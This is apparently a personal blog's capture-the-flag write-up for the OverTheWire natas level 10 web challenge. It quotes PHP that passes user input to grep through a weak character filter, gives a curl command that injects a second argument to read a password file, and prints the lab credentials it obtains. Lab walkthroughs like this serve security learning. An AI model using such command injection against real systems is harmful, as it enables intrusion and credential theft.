---
date: '2026-04-12'
description: natas-9 was the less loved child
draft: false
title: natas-10
weight: 11
ShowToc: false
---

| info | value                                       |
|:-----|--------------------------------------------:|
| user | `natas10`                                   |
| pass | `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`          |
| host | `http://natas10.natas.labs.overthewire.org` |

## explanation

this time, the sec dept actually put some effort into writing robust code

```html
For security reasons, we now filter on certain characters
<form>
  Find words containing:
  <input name="needle">
  <input type="submit" name="submit" value="Search">
</form>
```

peeping the source, we can see the exact same mechanism as the challenge prior, but with a more robust design

```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if (preg_match('/[;|&]/', $key)) {
        print "illegal char";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

as suggested by [this post](https://www.php.net/manual/en/function.preg-match.php#105924), the search now filters out the three chars (`;`,`|`,`&`) and because it's inside the character class `[]`, the pipe `|` becomes a literal, not an [or operator](https://stackoverflow.com/questions/8020848/how-is-the-and-or-operator-represented-as-in-regular-expressions)

luckily this condition doesn't utilize [preg_quote](https://www.php.net/manual/en/function.preg-quote.php), which would eliminate all prefix metacharacters with a backslash, and there are more than 3 chars that pass through the condition, let's use other prefixes from the [previous post](https://dat.vah.wtf/posts/overthewire/natas/natas-9/)

```sh
curl http://natas10.natas.labs.overthewire.org \
-u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu \
-d "needle=$ cat /etc/natas_webpass/natas11&submit=" | head -30
```

and es expected, some still work

```html
Output:
<pre>
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
```
